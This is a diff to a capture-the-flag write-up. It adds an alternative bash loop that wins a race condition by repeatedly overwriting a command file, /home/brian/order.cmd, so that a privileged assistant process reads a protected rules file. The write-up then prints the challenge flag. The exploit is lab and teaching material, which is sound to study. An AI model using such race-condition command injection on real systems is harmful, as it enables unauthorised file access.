@@ -56,6 +56,24 @@ done
 
 Run the exploit in background, and run the assistant, chose any command you want and get your flag in **output.txt**. You may have to run the assistant a few times. The timing is very short, and it can occure the `race.sh` doesn't write at the right moment.
 
+PS :
+
+If the race never works, it's because the CPU in too fast, here is an alternantive :
+
+```bash
+while :
+do	
+	if [ -f '/home/brian/order.cmd' ]; then
+		if ! grep -q "cat /lib" /home/brian/order.cmd
+		then
+    			echo 'cat /lib/udev/rules.d/02-uaccesss.rules' > /home/brian/order.cmd
+		fi
+	else
+		echo 'cat /lib/udev/rules.d/02-uaccesss.rules' > /home/brian/order.cmd
+	fi
+done
+```
+
 ### Flag
 
 ```Hero{c4r3fUl1_w1th_R4cE_c0nd1tI0nS}```
